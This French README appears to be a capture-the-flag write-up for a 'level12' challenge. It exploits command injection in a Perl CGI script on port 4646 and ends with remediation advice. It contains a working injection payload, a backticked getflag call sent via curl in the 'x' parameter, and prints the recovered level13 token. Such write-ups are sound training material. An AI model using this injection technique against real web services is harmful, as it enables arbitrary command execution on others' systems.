Voici le README adapté au même format que précédemment :

---

## Rapport de Vulnérabilité : Injection de Commande Perl via CGI

### Description

Cette vulnérabilité exploite une injection de commandes via un script Perl CGI (`level12.pl`) accessible localement via un serveur web tournant sur le port 4646. Le script utilise les entrées utilisateur sans filtrage adéquat dans une commande système (`egrep`). En exploitant cette vulnérabilité, il est possible d’exécuter arbitrairement des commandes shell avec les privilèges de l’utilisateur flag12 et ainsi récupérer le token pour passer au niveau suivant.

---

### Comment Exploiter la Faille

**Étape 1 : Analyse du script vulnérable**
Le script Perl utilise la fonction suivante :

```perl
@output = `egrep "^$xx" /tmp/xd 2>&1`;
```

* `$xx` provient directement d’un paramètre utilisateur via CGI (`param("x")`), sans filtrage suffisant.
* Ceci permet l’injection de commandes arbitraires en utilisant des backticks ou d'autres mécanismes d’exécution.

**Étape 2 : Préparation d'une requête malveillante**
Pour exécuter la commande `getflag`, il suffit d’envoyer une requête HTTP contenant une injection via le paramètre `x` :

```shell
ln -s /bin/getflag /tmp/GETFLAG

curl 'http://localhost:4646/level12.pl?x="%60/*/getflag>%262%60"'
```

* `%60` est le codage URL du caractère backtick (`` ` ``).
* `/*/getflag` contourne des restrictions de chemin pour appeler explicitement le binaire `getflag`.
* `>%262` redirige la sortie vers le flux d’erreurs standard (stderr, codé `%26` qui représente le caractère `&`).

**Étape 3 : Récupération du flag**
Le résultat du flag est enregistré dans les logs d’erreurs Apache. Affichez-les ainsi :

```shell
cat /var/log/apache2/error.log
```

Vous obtenez alors le flag :

```
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```

**Étape 4 : Passage au niveau suivant**
Utilisez ce token pour passer à l'utilisateur suivant :

```shell
su level13
Mot de passe : g1qKMiRpXf53AWhDaU7FEkczr
```

---

### Comment Résoudre la Faille

1. **Validation stricte des entrées utilisateur :**

   * Toujours valider et filtrer les entrées CGI avant de les utiliser dans une commande système.
   * Utilisez des modules Perl spécifiques qui assurent l’échappement approprié des caractères spéciaux (par exemple, `quotemeta()` ou équivalents).

2. **Ne pas appeler directement des commandes shell avec entrées non validées :**

   * Évitez l’utilisation de backticks sur les entrées utilisateur.
   * Si l’appel est nécessaire, utilisez les formes sécurisées d’exécution de commande (par exemple, `open()` avec liste de paramètres explicite).

3. **Séparer les privilèges :**

   * N’exécutez pas les scripts CGI avec des privilèges élevés inutilement.

---

### Conclusion

Cette vulnérabilité souligne l’importance critique d’un contrôle rigoureux des entrées utilisateurs lorsqu'elles sont utilisées dans des commandes système. L’absence de filtrage permet facilement à un attaquant d’exécuter des commandes arbitraires avec des privilèges élevés, conduisant à une escalade rapide des privilèges.
